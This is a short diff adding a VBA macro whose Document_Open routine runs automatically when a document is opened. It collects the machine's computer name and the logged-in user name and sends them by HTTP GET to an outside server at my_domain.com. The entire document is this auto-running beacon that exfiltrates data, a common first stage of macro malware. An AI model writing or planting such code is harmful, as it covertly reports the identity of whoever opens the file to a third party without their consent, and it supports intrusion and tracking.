@@ -1,0 +1,27 @@
+Sub Document_Open()
+
+Dim sHostName As String
+Dim sUserName As String
+
+' Get Host Name / Get Computer Name
+
+sHostName = Environ$("computername")
+
+' Get Current User Name
+
+sUserName = Environ$("username")
+
+
+Dim MyRequest As Object
+
+    Set MyRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
+
+    MyRequest.Open "GET", _
+
+    "http://www.my_domain.com/process_macro.php?deadbeef[]=" & sUserName & "&deadbeef[]=" & sHostName
+
+    ' Send Request.
+
+    MyRequest.Send
+
+End Sub
